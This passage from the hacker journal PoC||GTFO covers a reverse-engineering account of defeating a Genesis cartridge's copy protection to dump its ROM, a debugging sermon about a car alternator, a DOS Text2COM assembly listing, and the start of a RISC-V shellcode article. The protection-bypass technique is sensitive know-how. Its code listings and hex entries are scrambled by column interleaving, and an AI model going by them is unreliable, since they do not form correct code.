demonstrate that X86 is Turing-complete without
data fetches.
Tobias Ospelt shares with us a nifty little tale
on page 89 about the Java Key Store (JKS) file for-
mat, which is the default key storage method for
both Java and Android. Not content with a simple
proof of concept, Tobias includes a fully functional
patch against Hashcat to properly crack these files
in a jiffy.
There’s a trick that you might have fallen prey
to: sometimes there’s a perfectly innocent thumb-
nail of an image, but when you click on it to view
the full image, you are hit with different graphics
entirely. On page 97, Hector Martin presents one
technique for generating these false thumbnail im-
ages with gAMA chunks of a PNG file.
On page 100, the last page, we pass around the
collection plate. Our church has no interest in cash
or wooden nickels, but we’d love your donation of a
nifty reverse engineering story. Please send one our
way.
Rob Graham is our most elusive author, having
promised an article for PoCkGTFO 0x04 that finally
arrived this week. On page 66 he will teach you how
to write Ethernet card drivers in userland that never
switch back to the kernel when sending or receiving
packets. This allows for incredible improvements
to speed and drastically reduced memory require-
ments, allowing him to portscan all of /0 in a single
sweep.
Ryan Speers and Travis Goodspeed have
been toying around with MIPS anti-emulation
techniques, which this journal last covered in
PoCkGTFO 6:6 by Craig Heffner. This new tech-
nique, found on page 76, involves abusing the real
behavior of a branch-delay slot, which is a bit more
complicated than what you might remember from
your Hennessy and Patterson textbook.
Page 82 describes how BSDaemon and NadavCH
reproduced the results of the Gynvael Coldwind’s
and jur00’s Pwnie-winning 2013 paper on race con-
ditions, using Intel’s SAE tracer to not just verify
the results, but also to provide new insights into how
they might be applied to other problems.
415:02
Pier Solar and the Great Reverser
by Brandon L. Wilson
Hello everyone!
I’m here to talk about dumping the ROM from
one of the most secure Sega Genesis game ever cre-
ated.
Some versions of the Model 1 (and all of the
Model 2 devices) started to include a cartridge pro-
tection mechanism called the TMSS, or TradeMark
Security System. Basically this was just some extra
logic to lock up some of the internal Genesis hard-
ware if the word “SEGA” didn’t appear at a certain
location in the ROM and if the ASCII bytes repre-
senting “S”, “E”, “G”, “A” weren’t written to a certain
hardware register. Theoretically only people with
official Sega documentation would know to put this
code in their games, thereby preventing unlicensed
games, but that of course didn’t last long
And then there’s the Model 3 of my childhood
living room, which generally sucked. It doesn’t sup-
port the Sega CD, Game Genie, or any other inter-
esting accessories.
There was also a not-as-well-known CD add-on
for the Genesis called the Sega CD, or the Mega
CD in Europe and Japan, released in 1992. It al-
lowed for slightly-nicer-looking CD-based games as
an attempt to extend the Genesis’ life, but like many
other attempts to do so, that didn’t really work out.
Sega CD has its own BIOS and Motorola 68k
processor, which gets executed if you don’t have a
cartridge in the main slot on top. That way you
can still play all your old Genesis games, but if you
didn’t have one of those games inserted, it would
boot off the Sega CD BIOS and then whatever CD
you inserted.
There were two versions of it, the first one was
shaped to fit the Model 1 Genesis, and while the
second was modeled for the shape of the Model 2
Genesis, although either would work on the other
Genesis. The Model 1 is rare and prone to failure, so
it’s much more difficult to find. I have the Model 2.
So finally we get to the game itself, a game called
Pier Solar. It was released in 2010 and is a “home-
brew” game, which means it was programmed by a
bunch of fans of the Genesis, not in any way licensed
by Sega. Rather than just playing it in an emula-
tor, they took the time to produce an actual plastic
cartridge just like real games, make the plastic case
for it, nice printed manual, everything just as if it
This is a story about the unusual, or even crazy
techniques used in reverse engineering a strange tar-
get. It demonstrates that if you want to do some-
thing, you don’t have to be the best or the most
qualified person to do it—you should do what you
know how to do, whatever that is, and keep at it
until it works, and eventually it will pay off.
First, a little background on the environment
we’re talking about here. For those who don’t know,
the Sega Genesis is a cartridge-based, 16-bit game
console made by Sega and released in the US in
1989. In Europe and Japan, it was known as the
Sega Mega Drive.
As you may or may not know, there were three
different versions of the Genesis. The Model 1 Gen-
esis is on the left of Figure 1. Some versions of this
model have an extension port, which is actually just
a third controller port. It was originally intended
for a modem add-on, which was later scrapped.
5were a real game.
It’s unique in that it is the only game ever to
use the Sega CD add-on for an enhanced soundtrack
while you’re playing the game, and it has what they
refer to as a “high-density” cartridge, which means
it has an 8MB ROM, larger than any Genesis game
ever made.
It’s also unique in that its ROM had never been
successfully dumped by anyone, preventing folks
from playing it on an emulator. The lack of a ROM
dump was not from lack of trying, however.
Taking apart the cartridge, you can see that
they’re very, very protective of something. They
put some sort of black epoxy over the most interest-
ing parts of the board, to prevent analysis or direct
dumping of what is almost certainly flash memory.
Since they want to protect this, it’s our obliga-
tion to try and understand what it is and, if neces-
sary, defeat it. I can’t help it; I see something that
someone put a lot of effort into protecting, and I
just have to un-do it.
I have no idea how to get that crud off, and I
have to assume that since they put it on there, it’s
not easy to remove. We have to keep in mind, this
game and protection were created by people with a
long history of disassembling Genesis ROMs, writ-
ing Genesis emulators, and bypassing older forms of
copy protection that were used on clones and pirate
cartridges. They know what people are likely to try
in order to dump it and what would keep it secure
for a long time.
So we’re going to have to get creative to dump
this ROM.
There are two methods of dumping Sega Genesis
ROMs. The first would be to use a device dedicated
to that purpose, such as the Retrode. Essentially
it pretends to be a Sega Genesis and retrieves each
byte of the ROM in order until it has it all.
Unfortunately, when other people applied this to
the 8MB Pier Solar, they reported that it just pro-
duces the same 32KB over and over again. That’s
obviously not right, so they must have some hard-
ware under that black crud that ensures it’s actually
running in a Sega Genesis.
So, we turn to the other main method of dump-
ing Genesis ROMs, which involves running a pro-
gram on the Genesis itself to read the inserted car-
tridge’s data and output it through one of the con-
troller ports, which as I mentioned before is actually
just a serial port. The people with the ability to do
this also reported the same 32KB mirrored over and
over again, so that doesn’t work either.
Where’s the rest of the ROM data? Well, let’s
take a step back and think about how this works.
When we do a little Googling, we find that “large”
ROMs are not a new thing on the Genesis. Plenty
of games would resort to tricks to access more data
than the Genesis could normally.
Figure 1. From left to right, Sega Genesis models 1, 2, and 3.
6All this is documented online, of course. I found
it by Googling about Genesis homebrew and pro-
gramming your own games.
So where does this memory mapper live? It’s in
the game cartridge itself. Since the game runs from
the Genesis CPU, it needs a way to communicate
with the cartridge to tell it what memory to map
and where.
All Genesis I/O is memory-mapped, meaning
that when you read from or write to a specific mem-
ory address, something happens externally. When
you write to addresses 0xA130F3 through 0xA130FF,
the cartridge hardware can detect that and take
some kind of action. So for Super Street Fighter
2, those addresses are tied to the memory map-
per hardware, which swaps in blocks of memory as
needed by the game.
Pier Solar does the same thing, right? Not ex-
actly; loading up the first 32KB in IDA Pro reveals
no reads or writes here, nor to anywhere else in the
0xA130xx range for that matter. So now what?
Well, and this is something important that we
have to keep in mind, if the game’s code can access
all the ROM data, then so can our code. Right? If
they can do it, we can do it.
–——–
———
—–—–
So the question becomes, how do we run code on
a Sega Genesis? The same way others tried dump-
ing the ROM—through what’s called the Sega CD
transfer cable. This is an easy-to-make cable linking
a PC’s parallel port with one of the Genesis’ con-
troller ports, which as I said before is just a serial
port. There are no resistors, capacitors, or anything
like that. It’s literally just the parallel port connec-
tor, a cut-up controller cable, and the wire between
them. The cable pinout and related software are
publicly available online. 1
As I mentioned before, while the Sega CD is at-
tached, the Genesis boots from the top cartridge
slot only if a game is inserted. Otherwise, it uses
the BIOS to boot from the CD.
Since they weren’t too concerned with CD piracy
way back in 1992, there is no protection at all
against simply burning a CD and booting it. We
burn a CD with a publicly-available ISO of a Sega
CD program that waits to receive a payload of code
to execute from a PC via the transfer cable. That
gives us a way of writing code on a PC, transferring
it to a Sega Genesis + Sega CD, running it, and
communicating back and forth with a PC. We now
The system only maps four megabytes of car-
tridge memory, probably because Sega figured, “-
Four megs is enough ROM for anybody!” So it’s
impossible for it to directly reference memory be-
yond this region. However some games, such as Su-
per Street Fighter 2, are actually larger than that.
That game in particular is five megabytes.
They get access to the rest of the ROM by using
a really old trick called bank switching. Since they
know they can only address 4MB, they just change
which 4MB is visible at any one time, using external
hardware in the cartridge. That external hardware
is called a memory mapper, because it “maps” vari-
ous sections of the ROM into the addressable area.
It’s a poor man’s MMU.
So the game itself can communicate with the car-
tridge and tell the mapper “Hey, I need access to part
of that last megabyte. Put it at address 0x300000
for me.” When you access the data at 0x300000,
you’re really accessing the data at, say, 0x400000,
which would normally be just outside of the address-
able range.
0x000000
0x300000
0x380000
0x3fffff
1 unzip
pocorgtfo15.pdf comcable11.zip
7have ourselves a framework for dumping the ROM.
Great, we found some documentation online
about how to send code to a Genesis and execute
it, now what?
Well, let’s start with trying to understand what
code for this thing would even look like. Wikipedia
tells us that it has two processors. The main pro-
cessor is a Motorola 68000 CPU running at 7.6MHz,
and which can directly access the other CPU’s
RAM.
The second CPU is a Zilog Z80 running at 4MHz,
whose sole purpose is to drive the Yamaha YM2612
FM sound chip. The Z80 has its own RAM, which
can be reset or controlled by the main Motorola
68000. It also has the ability to access cartridge
ROM—so typically a game would play sound by
transferring over to the Z80’s RAM a small program
that reads sound data from the cartridge and dumps
it to the Yamaha sound chip. So when the game
wanted to play a sound, the Motorola 68k would re-
set the Z80 CPU, which would start executing the
Z80 program and playing the sound.
So anyway, combined that’s 72KB of RAM:
64KB for the 68k and 8KB for the Z80.
0X000000
0X400000
0Xa00000
0Xa10000
0Xc00000
0Xff0000
Cartridge
ROM/RAM
sound RAM
0Xa10002-0Xa10019
reserved
Controers
I/O
reserved
reserved
68000 RAM
We also have 64KB of Motorola 68k RAM, start-
ing at address 0xFF0000. This should give you an
idea of what code would look like, essentially read-
ing from and writing to a series of memory mapped
I/O registers.
Reports online are that the standard Sega CD
transfer cable ROM dumping method doesn’t work,
but since we have the source code to it, let’s go ahead
and try it ourselves. To do that, I needed an older
Genesis and Sega CD. I went to a flea market and
picked up a Model 1 Sega Genesis and Model 2 Sega
CD for a few dollars, then soldered together a trans-
fer cable.
We now have the Sega Genesis attached to the
Sega CD and our boot CD inserted, we then cover
up the “cartridge detect” pin with tape, so that it
won’t detect an inserted cartridge. It will boot to
the Sega CD.
Memory MAP
reserved
z80 addressing
space
After that is the most important area, starting
at 0xA10000, which is where all the Genesis hard-
ware is controlled. Here we find the registers for
manipulating the two controller ports, and the area
I mentioned earlier about communicating directly
with the hardware in the cartridge.
68000
memory bank
0X0000
As the system turns on, the Sega CD and then
our burned boot CD starts up. Then the ROM
dumping program is transferred over from the PC
and executed on the Genesis.
0X2000
0X4000
0X8000
The dump is transferred back to the PC via the
transfer cable. We take a look at it in a hex editor,
but the infernal thing is still mirrored.
0X10000
0Xffffff
Why is this happening? Well, we’re reading the
data off the cartridge using the Genesis CPU, the
same way the game runs, so maybe the cartridge
hardware requires a certain series of instructions to
execute first? I mean, a certain set of values might
need to be written to a certain address, or a certain
address might need to be read.
Documentation also tells us the memory map of
the Genesis. The first part we’ve already covered,
that we can access up to 0x400000, or 4MB, of the
cartridge memory. The next useful area starts at
0xA00000, which is where you would read from or
write to the Z80’s RAM.
If that’s the case, maybe we should let the game
boot as much as possible before we try the dump.
But, if the game has booted, we’re going to need to
steal control away from it, which means we need to
change how it runs.
8Enter the Game Genie, which you might remem-
ber from when you were a kid. You’d plug your
game into the cartridge slot on top of the Game Ge-
nie, then put that in your Genesis, turn it on, flip
through a code book and enter your cheat codes,
then hit START and cheat to your heart’s content.
As it turns out, this thing is actually very useful.
What it really does is patch the game by intercepting
attempts to read cartridge ROM, changing them be-
fore they make it to the console for execution. The
codes are actually address/value pairs. For exam-
ple, if there’s a check in a game to jump to a “you’re
dead” subroutine when your health is at zero, you
could simply NOP out that Motorola 68k assembly
instruction. It will never take that jump, and your
character will never die.
Those of you who grow up with this thing might
remember that some games had a “master” code that
was required before any other codes. That code
was for defeating the ROM checksum check that the
game does to make sure it hasn’t been tampered
with. So once you entered the master code, you
could make all the changes you wanted.
Since the code format is documented, 2 we can
easily make a Game Genie code that will change
the value at a certain address to whatever we spec-
ify. We can make minor changes to the game’s code
while it runs.
Due to the way the Motorola 68k works, we can
only change one 16-bit word at a time, never just a
single byte. No big deal, but keep it in mind because
it limits the changes that we can make.
Well, that’s nice in theory, but can it really work
with this game? First we fire up the game with the
2 unzip
Game Genie plugged in, but don’t enter any codes,
just to see if the cartridge works while it’s attached.
Yes, it does, so next we fire up the game, again
with the Game Genie plugged in, but this time we
enter a code that, say, locks up hard. Now, that’s
not the best test in the world, since the code could
be doing something we don’t understand, but if the
game suddenly won’t boot, we know at least we’ve
made an impact.
Now, according to online documentation, the for-
mat of a Genesis ROM begins with a 256-byte inter-
rupt vector table of the Motorola 68k,followed by a
256-byte area holding all sorts of information about
the ROM, such as the name of the game, the author,
the ROM checksum, etc. Then finally the game’s
machine code begins at address 0x0200.
If we make a couple of Game Genie codes that
place the Motorola 68k instruction “jmp 0x0200” at
0x200, the game will begin with an infinite loop. I
tried it, and that’s exactly what happened. We can
lock the game up, and that’s a pretty strong indica-
tion that this technique might work.
Getting back to our theory: if the game needs
to execute a special set of instructions to make the
32KB mirroring stop, we need to let it run and then
take back control and dump the ROM. How do we
know when and where to do that? We fire up a
disassembler and take a look.
1 0 x0ec6
0 x0ecc
3 0 x0ed2
0 x0ed4
5 0 x0ed6
0 x0edc
7 0 x0ee2
0 x0eea
9 0 x0eec
0 x0ef2
11 0 x 0 e f 8
0 x0efa
13 0 x 0 f 0 0
0 x0f06
15 0 x 0 f 0 c
0 x0f12
17 0 x 0 f 1 4
2079000015 de
317 c 0 0 0 1 0 0 0 a
588 f
600 c
2079000015 de
317 c 0 0 0 1 0 0 0 a
0839000000 c0
670 e
2079000015 de
317 c0bb80004
600 c
2079000015 de
317 c 0 e 1 0 0 0 0 4
2079000015 de
0 c680001000a
6608
4 ef90000e000
pocorgtfo15.pdf MakingGenesisGGcodes.txt AdvancedGenGGtips.txt
9
movea . l 0 x15de . l , a0
move . w 0x1 , 0 xa ( a0 )
addq . l 0x4 , a7
bra . b 0 x e e 2
movea . l 0 x15de . l , a0
move . w 0x1 , 0 xa ( a0 )
b t s t . b 0x0 , 0 xc00005 . l
beq . b 0 x e f a
movea . l 0 x15de . l , a0
move . w 0xbb8 , 0 x4 ( a0 )
bra . b 0 x f 0 6
movea . l 0 x15de . l , a0
move . w 0 xe10 , 0 x4 ( a0 )
movea . l 0 x15de . l , a0
cmpi . w 0x1 , 0 xa ( a0 )
bne . b 0 x f 1 c
jmp 0 xe000 . l• We hit the RESET button on the console. The
Genesis starts to boot, detects the Game Ge-
nie and game cartridge so it boots from those
instead of the CD.
• We enter our Game Genie codes for the game
to jump into 68k RAM and hit START to start
the game, aaaand. . .
It is at 0x000F14 that the code takes its first
jump outside of the first 32KB, to address 0x00E000.
So assuming this code executes properly, we know
that at the moment the game takes that jump, the
mirroring is no longer occurring. That’s the safest
moment to take control. We don’t yet have any idea
what happens once it jumps there, as this first 32KB
is all we have to study and work with.
So we can make 16-bit changes to the game’s
code as it runs via the Game Genie, and separately,
we can run code on the Genesis and access at least
part of the cartridge’s ROM via the Sega CD. What
we really need is a way to combine the two tech-
niques.
So then I had an idea: What if we booted the
Sega CD and wrote some 68k code to embed a ROM
dumper at the end of 68k RAM, then insert the
Game Genie and game while the system is on, then
hit the RESET button on the console, which just
resets the main 68k CPU, which means our ROM
dumper at the end of 68k RAM is still there It should
then go to boot the Game Genie this time instead
of the Sega CD, since there’s now a cartridge in the
slot, then enter Game Genie codes to make the game
jump straight into 68k RAM, then boot the game,
giving us control?
That’s quite a mouthful, so let’s go over it one
more time.
• Attempting this technique, the system locks
up just as we should be jumping into the pay-
load left in RAM. But why?
I went over this over and over and over in my
head, trying to figure out what’s wrong. Can you
see what’s wrong with this logic?
Yeah, so, I failed to take into account anything
the Game Genie might be doing to mess with our
embedded ROM dumping code in the 68K’s RAM.
When you disassemble the Game Genie’s ROM, you
find that one of the first things it does is wipe out
all of the 68K’s RAM.
1 0 x0294
0 x029a
3 0 x029e
0 x02a0
5 0 x02a2
41 f 9 0 0 f f 0 0 0 0
323 c 7 f f f
7000
30 c0
51 c 9 f f f c
l e a . l 0 x f f 0 0 0 0 . l , a0
move . w 0 x 7 f f f , d1
moveq 0x0 , d0
move . w d0 , ( a0 )+
dbra d1 , 0 x2a0
We can’t leave code in main CPU RAM across a
reboot because of the very same Game Genie that
lets us patch the ROM to jump into our shellcode.
So what do we do?
We know we can’t rely on our code still being
in 68k RAM by the time the game boots, but we
need something, anything to persist after we reset
the console. Well, what about Z80’s RAM?
Studying the Game Genie ROM reveals that
it puts a small Z80 sound program in Z80 RAM,
for playing the code entry sound effects, like when
you’re selecting or deleting a character. This pro-
gram is rather small, and the Game Genie doesn’t
wipe out all of Z80 RAM first. It just copies this
little program, leaving the rest alone.
So instead of putting our code at the end of
68K RAM, we can instead put it at the end of
Z80 RAM, along with a little Z80 code to copy it
back into 68k RAM. We can make a sequence of
Game Genie codes that patches Pier Solar’s Z80 pro-
gram to jump right to the end of Z80 RAM, where
our Z80 code will be waiting. We’ll then be free to
copy our 68k code back into 68k RAM, hopefully
before the Game Genie makes the 68k jump there.
• We write some 68k shellcode to read the ROM
data and push it out the controller port back
to the PC.
• To run this code, we boot the Sega CD, which
receives and executes a payload from the PC.
• This payload copies our ROM dumping code
to the end of 68k RAM, which the 32KB dump
doesn’t seem to use.
• We insert our Game Genie and game into the
Genesis. This makes the system lock up, but
that’s not necessarily a bad thing, as we’re
about to reset anyway.
10With this new arrangement, we get control of
the 68K CPU after the game has booted! But the
extracted data is still mirrored, even though we are
executing the same way the real game runs.
So now what? Well, we think that the CPU must
be actively running from ROM, but except for mi-
nor patches with the Game Genie, we know our code
can only run from RAM. Is there any way we can
do both? Well, as it turns out, we already have the
answer.
We have two processors, and we were already us-
ing both of them! We can use the Game Genie to
make the 68k spin its wheels in an infinite loop in
ROM, just like the very first thing we tried with it,
while we use the other processor to dump it.
We were overthinking the first (and second) at-
tempts to get control away from the game, as there’s
no reason the 68K has to be the one doing the dump-
ing. In fact, having the Z80 do it might be the only
way to make this work.
So the Z80 dumper does its thing, dumping car-
tridge data through the Sega CD’s transfer cable
while the 68K stays locked in an infinite loop, still
fetching instructions from cartridge hardware! As
far as the cartridge is concerned, the game is run-
ning normally.
And YES, finally, it works! We study the first
4MB in IDA Pro to see how the bank switching
works. As luck would have it, Pier Solar’s bank
switching is almost exactly the same as Super Street
Fighter 2.
Armed with that knowledge, we can modify the
dumper to extract the remaining 4MB via bank
switching, which I dumped out in sixteen pieces
very slowly, through lots and lots and lots of trigger-
ing this crazy boot procedure. I mean, I can’t tell
you how excited I was that this crazy mess actually
worked. It was like four o’clock in the morning, and
I felt like I was on top of the world. That’s why I
do this stuff; really, that payoff is so worth it. It’s
just indescribable.
Okay, so what are the differences between the
game’s code and our code?
We’re using a Game Genie, maybe the game de-
tects that? This is unlikely, as the game boots fine
with it attached. If it had a problem with the Game
Genie, you’d think it wouldn’t work at all.
Well, we’re running from RAM, and the game is
running from ROM. Perhaps the cartridge can dis-
tinguish between instruction fetches of code running
from ROM and the data fetches that occur when
code is running from RAM?
Our only ability to change the code in ROM
comes from the Game Genie, which is limited to
five codes. A dumper just needs to write bytes in
order to 0xA1000F, the Controller 2 UART Transmit
Buffer, but code to do that won’t fit in five codes.
Luckily there is a cheat device called the Pro Ac-
tion Replay 2 which supports 99 codes. These are
extremely rare and were never sold in the States, but
I was able to buy one through eBay. Unfortunately,
the game doesn’t boot with it at all, even with no
codes. It just sits at a black screen, even though the
Action Replay works fine with other cartridges.
11The serial EEPROM, while it doesn’t require
a battery to hold its data, does prevent the game
from running in emulators that don’t explicitly sup-
port it. It also breaks compatibility with those flash
cartridges that people use for playing downloaded
ROMs on real consoles.
Once I got the ROM dumped, I couldn’t help
but try to get it working in some kind of emulator,
and at the time DGen was the easiest to understand
and modify, so I did the bare minimum to get that
working. It boots and works for the most part, but
it has a few graphical glitches here and there, prob-
ably related to VDP internals I don’t and will never
understand. 3
Eventually somebody else came along and did it
better, with a port to MESS.
Don’t think anything is beyond your abilities:
use the skills you have, whatever they may be. Me,
I do TI graphing calculator programming and re-
verse engineering as a hobby. The two main proces-
sors those calculators use are the Motorola 68K and
Zilog Z80, so this project was tailor-made for me.
But as far as the hardware behind it, I had no clue;
I just had to make some guesses and hope for the
best.
“This isn’t the most efficient method” and “No-
body else would try this method.” are not reasons
to not work on something. If anything, they’re ac-
tually reasons to do it, because that means nobody
else bothered to try it, and you’re more likely to be
first. Crazy methods work, and I hope this little
endeavor has proven that.
Now that I had a complete dump, I looked for the
ROM checksum calculation code and implemented
it PC-side, and it actually matched the checksum
in the ROM header. Then I knew it was dumped
correctly.
Now starts the long process of studying the dis-
assembly to understand all the extra hardware. For
example, the save-state hardware is just a serial
EEPROM accessed by reads and writes to a cou-
ple of registers.
So now that we have all of it, what exactly can
we say was the protection? Well, I couldn’t tell you
how it works at a hardware level other than that it
appears to be an FPGA, but, disassembly reveals
these secrets from the software side.
The first 32KB is mirrored over and over until
specific accesses to 0x18010 occur. The mirroring
is automatically re-enabled by hardware if the sys-
tem isn’t executing from ROM for more than some
unknown amount of time.
3 VDP
is the display hardware in the Genesis.
1215:03
That car by the bear ain’t got no fire; or,
A Sermon on Alternators, Voltmeters, and Debugging
by Pastor Manul Laphroaig,
who is not certified by ASE.
I also learned rather quickly that my four courses
of auto-shop in high school amounted to a lot of
book knowledge and not that much practical knowl-
edge. My buddies who bought old cars and fixed
them first-hand learned—and still know—a hell of
a lot more about their machines that I ever will
about mine. When squirrels chewed through the
wiring harness, when metal flakes made the wind-
shield wiper activate on its own, when the fuel line
was cut by rubbish in the street as I was tearing
down the Interstate at Autobahn speeds, I often
took the lazy way out and paid for a professional
to repair it.
But while it’s true that you learn more by build-
ing your own birdfeeder, that’s not the purpose
of this sermon. Today I’d like to tell you about
some alternator trouble. Somehow, someway, by
some mechanism unknown to gods and men, this
car seemed to be killing every perfectly good alter-
nator that was placed inside of it, and no mechanic
could figure out why.
It went like this: I’d be off having adventures,
then drop into town to pick up my wheels. Having
been away for so long, the battery would be dead.
“No big deal,” I’d say and jump-start the engine.
After the engine caught, I’d remove the cables, and
soon enough the battery would be dead again, the
engine with it. So I’d switch to driving my Ford 5
and send my car to the shop.
Dear neighbors, I have a story to tell, and it’s not a
very flattering one.
A few years back, when I was having a bad day,
I bought a five hundred dollar Mercedes and took
to the open road. It had some issues, of course, so
a hundred miles down the road, I stopped in rural
Virginia and bought a new stereo. This was how I
learned that installing a stereo in a Walmart parking
lot looks a lot like stealing a stereo from a Walmart
parking lot. 4
4 The
fastest way to clear up such a misunderstanding, when confronted by a local, is to ask to borrow some tools.
auto-shop class we learned that FORD stands for “Found On Road Dead,” “Fix Or Repair Daily,” or “Job Security.”
Coach Crigger never mentioned what Mercedes stood for, but I expect it depends upon your credit, current lease terms, and
willingness to take a balloon payment!
5 In
1314cause he never started the car at night. To really
understand something, you ought to have a deep fa-
miliarity with it; a passing view is bound to give you
a quick little fix, or an exploit that doesn’t always
achieve continuation on its target.
Further, he never noticed that the battery only
died after a jumpstart, but never in normal use, be-
cause all of the cars that he sees have already ex-
hibited one problem or another and most of them
were daily drivers. Whenever you are hunting a
rare bug, consider the pre-existing conditions that
brought that crash to your attention. 6
Getting back to the bastard who designed a car
with a single idiot light and no voltmeter, the sin-
gle handiest tool to avoid these unnecessary repairs
would have been to reproduce the problem when the
car wasn’t failing. Rather than spending months
between the car failing to start, a voltmeter would
have shown me that the voltage was low only before
the engine was first revved up! In the same way, we
should use every debugging tool at our disposal to
make a problem reproducible in the shortest time
possible, even if that visibility doesn’t end in the
problem that was first reported.
Paying attention to the voltage during a few
drives would have revealed the real problem, even
when the battery is sufficiently charged that the
engine doesn’t die. For this reason, we should be
looking for the root cause of EVERYTHING, never
settling for the visible effects.
We who play with computers have debugging
tools that the best mechanics can only dream of.
We have checkpoint-restart debuggers which can
take a snapshot just before a failure, then repeat-
edly execute a crash until the cause is known. We
have strace and dtrace and ftrace, we have dis-
assemblers and decompilers, we have tcpdump and
tcpreplay, we have more hooks than Muad’Dib’s
Fedaykin! We can deluge the machine with a thou-
sand core dumps, then merge them into a single test
case that reproduces a crash with crystal clarity; or,
if we prefer, a proof of concept that escapes from
the deepest sandbox to the outer limits!
Yet the humble alternator still has important
lessons to teach us.
The mechanics at the shop would test the al-
ternator, and it’d look good. They’d test the bat-
tery, and it’d look good. Then they’d start the car,
and the alternator’s voltage would be low, so they’d
replace it out of caution. No one knew the root
cause, but the part’s under warranty, and the labor
is cheap, so who cares?
What actually happened is this: The alternator
doesn’t engage until the engine revs beyond natu-
ral idling or starting. The designers must have done
this to reduce the load on the starter motor, but it
has the annoying side effect of letting the battery
run to nothing after a jump start. The only indica-
tion to the driver is that the lights are a little dim
until the gas is first pressed.
I learned this by accident after installing a volt-
meter. Setting aside for the moment how absurd it
is that a car ships without one, let’s consider how
the mechanics were fooled. In software terms, we’d
say that they were confronted with a poorly repro-
ducible test case; they were bug-hunting from anec-
dotes, from hand-picked artisanal data. This always
ends in disaster, whether it’s a frustrated software
maintainer or a mechanic who becomes an unknow-
ing accomplice to four counts of warranty fraud.
So what mistakes did I make? First, I outsourced
my understanding to a shop rather than fixing my
own birdfeeder. The mechanic at the shop would
see my car once every six months, and he’d forget
the little things. He never noticed that the lights
were slightly dimmer before revving the engine, be-
6 Some of you may recall the story of World War II statisticians who were called in to decide where to add armor based on
surveys of damage to returned Allied bombers. The right answer was to armor not where there were the most bullet holes, but
where there were none. Planes hit in those areas didn’t make it home to be surveyed.
1515:04 Text2COM
Silver Jubilee Edition, specially re-mastered for PoCkGTFO
by Saumil Shah (@therealsaumil),
with special help from Mr. Udayan Shah
START:
MOV
PUSH
POP SI,FILE
CS
DS ; Start of Text File
CLEAR:
MOV
XOR
MOV
XOR
MOV
MOV
INT AH,06
AL,AL
BH,07
CX,CX
DH,18
DL,4F
10 ;
;
;
;
;
;
;
Scroll Up Window
0 = Clear Screen
White over Black
Start at 0,0
row 22
column 79
Video Services
MOV
XOR
XOR
INT AH,02
DX,DX
BH,BH
10 ;
;
;
;
Set Cursor Position
0,0
Page number 0
Video Services
DL,AL
AL
AL,E5
END
AH,02
21 ;
;
;
;
;
;
;
AL = [DS:SI]
DL = character to write
1's Complement
E5 = 1's C (EOF)
If EOF character, jump to END
Write Character
DOS Services
MOV
XOR
INT AH,03
BH,BH
10 ; Get Cursor Position
; Page 0
; Video Services. DH,DL = Row,Col
CMP
JLE DH,16
WRITECHAR ; Is row 22?
; Jump if < 22 to WRITECHAR
MOV
MOV
INT AH,09
DX,PAGER
21 ; Write $-Terminated String
; Address of Pager String
; DOS Services
MOV
INT
JMP AH,08
21
CLEAR ; Read Single Character
; DOS Services
; Jump to CLEAR
WRITECHAR:
LODSB
MOV
NOT
XOR
JZ
MOV
INT
; Set Data Segment = Code Segment
END:
INT 20
PAGER:
DB
DB '[Text2COM by Saumil Shah (c)1992] '
'Press Any Key... $'
Text2COM generates self-
displaying README.COM files
by prefixing a short sequence
of DOS Assembly instruc-
tions before a text file. The
resultant file is an MS-DOS
.COM program which can be
executed directly from the
command prompt.
The Text2COM code dis-
plays the contents of the ap-
pended file page by page.
Text2COM’s executable code
is created by MS-DOS’s
DEBUG program.
FILE:
; Text content goes here.
Then take any text file and concatenate it with README.BIN and store the resultant file as README.COM:
C:\>copy README.BIN+TEXT2COM.TXT README.COM
You now have a self-displaying README.COM file!
C:\>debug
-n README.BIN
-e 100 BE 78 01 0E 1F
-e 110 4F CD 10 B4 02
-e 120 34 E5 74 1C B4
-e 130 16 7E E8 B4 09
-e 140 CD 20 5B 54 65
-e 150 61 75 6D 69 6C
-e 160 39 39 32 5D 20
-e 170 65 79 2E 2E 2E
-rcx
CX 0000
:78
-w
Writing 00078 bytes
-q
B4
31
02
BA
78
20
50
20
06
D2
CD
42
74
53
72
24
16
30
30
21
01
32
68
65
0A
C0
FF
B4
CD
43
61
73
B7
CD
03
21
4F
68
73
07
10
30
B4
4D
20
20
31
AC
FF
08
20
28
41
C9
88
CD
CD
62
63
6E
B6
C2
10
21
79
29
79
18
F6
80
EB
20
20
20
B2
D0
FE
C5
53
31
4B15:05
RISC-V Shellcode
by Don A. Bailey
RISC-V is a new and exciting open source archi-
tecture developed by the RISC-V Foundation. The
Foundation has released the Instruction Set Archi-
tecture open to the public, and a Privilege Architec-
ture Model that defines how general purpose operat-
ing systems can be implemented. Even more excit-
ing than a modern open source processing architec-
ture is the fact that implementations of the RISC-V
are available that are fully open source, such as the
Berkeley Rocket Chip 7 and the PULPino. 8
To facilitate silicon development, a new lan-
guage developed at Berkeley, Chisel, 9 was devel-
oped. Chisel is an open-source hardware language
built from Scala, and synthesizes Verilog. This al-
lows fast, efficient, effective development of hard-
ware solutions in far less time. Much of the Rocket
Chip implementation was written in Chisel.
Furthermore, and perhaps most exciting of all,
the RISC-V architecture is 128-bit processor ready.
Its ISA already defines methodologies for imple-
menting a 128-bit core. While there are some
aspects of the design that still require definition,
enough of the 128-bit architecture has been specified
that Fabrice Bellard has successfully implemented
a demo emulator. 10 The code he has written as a
demo of the emulator is, perhaps, the first 128-bit
code ever executed.
Binary Exploitation
To compromise a RISC-V application or kernel
in the traditional memory corruption manner, one
must understand both the ISA and the calling con-
vention for the architecture. In RISC-V, the term
XLEN is used to denote the native integer size of
the base architecture, e.g. XLEN=32 in RV32G.
Each register in the processor is of XLEN length,
meaning that when a register is defined in the spec-
ification, its format will persist throughout any def-
inition of the RISC-V architecture, except for the
length, which will always equate to the native inte-
ger length.
7 git
General Registers
In general, RISC-V has 32 general (or x) registers:
x0 through x31. 11 These registers are all of length
XLEN, where bit zero is the least-significant-bit and
the most-significant-bit is XLEN-1. These registers
have no specific meaning without the definition of
the Application Binary Interface (ABI).
The ABI defines the following naming conven-
tions to contextualize the general registers, shown
in Figure 2. 12
clone https://github.com/freechipsproject/rocket-chip
8 http://www.pulp-platform.org/
9 https://chisel.eecs.berkeley.edu/
10 https://bellard.org/riscvemu/
11 RISC-V
12 RISC-V
ISA Specification v2.1, Page 10, Figure 2.1.
ISA Specification v2.1, Page 109, Table 20.2
17Register
x0
x1
x2
x3
x4
x5-7
x8
x9
x10-11
x12-17
x18-27
x28-31
ABI Name
zero
ra
sp
